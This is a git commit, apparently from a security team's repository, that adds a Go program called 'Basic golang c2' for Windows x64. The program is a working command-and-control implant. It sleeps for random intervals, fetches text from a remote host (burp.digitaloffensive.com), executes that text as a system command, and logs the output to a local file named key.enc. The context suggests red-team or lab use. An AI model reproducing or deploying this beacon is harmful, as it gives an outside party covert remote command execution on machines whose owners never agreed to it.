0611edd47fc4a2d19bfd864aa762cb1b300a4db2
SCIS Security <4706268+dc401@users.noreply.github.com>
2024-08-21 12:09:15 -0500

    Add files via upload
    providing staging files built in windows with comment and win x64 compatibility via go build bc2.go

---
+++ build/bc2.go
@@ -0,0 +1,89 @@
+//Basic golang c2 with logging
+//-------------------------------------------
+
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"os"
+	"os/exec"
+	"time"
+)
+
+func main() {
+	// Seed the random number generator with the current time
+	rand.Seed(time.Now().UnixNano())
+
+	for {
+		// Generate a random sleep duration between 10 and 5 minutes
+		sleepDuration := time.Duration(rand.Intn(10)+1) * time.Minute
+
+		time.Sleep(sleepDuration)
+
+		// Run the command
+		runCommand()
+	}
+}
+
+func runCommand() {
+	// Specify the URL of the text file to download
+	fileURL := "http://burp.digitaloffensive.com"
+
+	// Download the file
+	response, err := http.Get(fileURL)
+	if err != nil {
+		fmt.Printf("Error downloading file: %v\n", err)
+		return
+	}
+	defer response.Body.Close()
+
+	// Read the file contents into a byte slice
+	fileBytes, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		fmt.Printf("Error reading file: %v\n", err)
+		return
+	}
+
+	// Convert the byte slice to a string
+	fileContent := string(fileBytes)
+
+	// Print the file contents
+	//    fmt.Println(fileContent)
+
+	// Replace "ls" with the command you want to run
+	//cmd := exec.Command("ls", "-l")
+	cmd := exec.Command(fileContent)
+	// Run the command and get the output
+	output, err := cmd.Output()
+	if err != nil {
+		fmt.Printf("Error running command: %v\n", err)
+		return
+	}
+	//      fmt.Printf("Command output:\n%s\n", output)
+	// Get the current date and time
+	now := time.Now()
+	// Open a file to write the output
+	file, err := os.OpenFile("key.enc", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Printf("Error opening file: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	// Write the date and time to the file
+	_, err = fmt.Fprintf(file, "\n\n--- Command ran at %s ---\n", now.Format("2006-01-02 15:04:05"))
+	if err != nil {
+		fmt.Printf("Error writing to file: %v\n", err)
+		return
+	}
+
+	// Write the output to the file
+	_, err = file.Write(output)
+	if err != nil {
+		fmt.Printf("Error writing to file: %v\n", err)
+		return
+	}
+}
